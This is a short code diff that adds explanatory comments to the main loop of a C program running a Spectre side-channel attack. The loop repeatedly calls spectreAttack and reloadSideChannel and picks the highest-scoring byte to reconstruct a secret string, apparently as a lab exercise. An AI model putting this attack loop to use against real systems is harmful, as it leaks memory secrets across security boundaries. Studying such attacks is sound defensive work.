@@ -129,14 +129,20 @@ int main() {
   int consecutive_chars = 0;
   char tmpstr[STRLEN+1];
   for(int i = 0; i < STRLEN; i++){
+    //Set scores to 0
     for(int j = 0; j < 256; j++){
       scores[j] = 0;
     }
+    // Iterate through and perform a spectre attack to populate the scores
+    // Scores in this one aren't real they're some issue which is why we're
+    // using the cache dump in victim. Attacker just trains and pulls secret data
     for(int j = 0; j < 1000; j++){
 //     printf("larger_x + i: %d\n", (larger_x+i));
       spectreAttack(larger_x + i);
       reloadSideChannel();
     }
+    // Find the max for scores that will be our guess at what char is in use.
+    // 0 -> 256 is the space for a byte
     int max = 0;
     for(int j = 0; j < 256; j++){
       if(scores[max] < scores[j]){
